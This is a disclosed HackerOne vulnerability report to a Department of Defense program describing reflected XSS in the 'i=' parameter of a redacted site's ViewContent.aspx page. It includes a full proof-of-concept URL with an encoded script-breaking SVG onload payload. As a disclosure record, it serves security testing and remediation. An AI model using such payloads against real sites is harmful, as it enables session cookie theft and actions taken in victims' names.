# Reflected XSS in https://www.██████/

## Report Details
- **Report ID**: 924650
- **URL**: https://hackerone.com/reports/924650
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-07-15T16:43:59.627Z
- **Disclosed**: 2020-09-29T20:34:27.623Z

## Reporter
- **Username**: nirajgautamit
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hello Security Team,
I would like to report the XSS vulnerability on your system.
The `i=` parameter is not escaped properly for URL encoded values.

Steps To Reproduce:
Visit the following POC link:
https://www.████/ViewContent.aspx?con_id_pk=2726&fr=s&i=l9716%27();}]9836&001%3C%2FScript%2F%3E%3CSvg%2FOnLoad%3D(confirm)(1)%3E=1

1. Tested on firefox browser: █████████ 

2.Tested on google chrome browser: ██████████
Thanks
Niraj

## Impact

An XSS attack allows an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, perform requests in the name of the victim, or for phishing attacks.

## Attachments
No attachments
